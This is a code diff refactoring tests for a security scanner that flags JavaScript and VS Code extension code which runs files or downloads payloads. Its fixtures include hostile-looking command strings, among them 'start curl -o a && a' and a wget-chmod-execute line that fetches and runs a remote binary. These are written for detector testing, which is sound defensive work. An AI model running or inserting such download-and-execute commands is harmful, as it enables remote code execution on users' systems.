@@ -8,7 +8,8 @@ from pathlib import Path
 from typing import ClassVar
 
 from cordon_scanner import Scanner
-from cordon_scanner.detect.secrets.secrets import SourcePaths
+from cordon_scanner.analysis.shared.source_paths import SourcePaths
+from cordon_scanner.detect.code.capability.javascript import JavaScriptCapabilities
 
 MANIFEST = {
     "name": "theme",
@@ -143,16 +144,14 @@ class TestWhatCountsAsRunningAFile:
     """`start` runs a file, or opens a link in the browser."""
 
     def test_opening_a_link_is_not_running_a_file(self) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
 
-        runs = CapabilityDetector._RUNS_A_FILE
+        runs = JavaScriptCapabilities.RUNS_A_FILE
         assert runs.search('`start "" "${extUrl}"`') is None
         assert runs.search("'start https://example.invalid/docs'") is None
 
     def test_starting_a_file_still_is(self) -> None:
-        from cordon_scanner.detect.code.capability import CapabilityDetector
 
-        runs = CapabilityDetector._RUNS_A_FILE
+        runs = JavaScriptCapabilities.RUNS_A_FILE
         assert runs.search('`start "" "${tmp}"`') is not None
         assert runs.search("'start curl -o a && a'") is not None
         assert runs.search('"sh ./payload.sh"') is not None
@@ -170,7 +169,7 @@ class TestActivationRunsUnasked:
 
     def test_the_manifests_main_is_the_activation_entry(self, tmp_path: Path) -> None:
         from cordon_scanner.detect.base import FileUnit
-        from cordon_scanner.engine.engine import Engine
+        from cordon_scanner.engine.pipeline.hooks import Hooks
         from cordon_scanner.foundation.content import FileContent
 
         manifest = json.dumps(
@@ -188,22 +187,22 @@ class TestActivationRunsUnasked:
                 ("t.vsix!extension/node_modules/lib/index.js", b"module.exports = 1;"),
             )
         ]
-        assert Engine._extension_entries(units) == {"t.vsix!extension/out/extension.js"}
+        assert Hooks.extension_entries(units) == {"t.vsix!extension/out/extension.js"}
 
     def test_a_project_has_no_activation_entry(self) -> None:
         from cordon_scanner.detect.base import FileUnit
-        from cordon_scanner.engine.engine import Engine
+        from cordon_scanner.engine.pipeline.hooks import Hooks
         from cordon_scanner.foundation.content import FileContent
 
         raw = json.dumps({"name": "app", "main": "index.js"}).encode()
         units = [FileUnit(FileContent(path="package.json", raw=raw, size=len(raw)))]
-        assert Engine._extension_entries(units) == set()
+        assert Hooks.extension_entries(units) == set()
 
 
 class TestSourceMapsAreNeverRun:
     def test_a_download_and_run_in_a_source_map_does_not_block(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         source = "exec('wget -q https://example.invalid/x -o /tmp/x && chmod +x /tmp/x && /tmp/x')"
         sourcemap = (
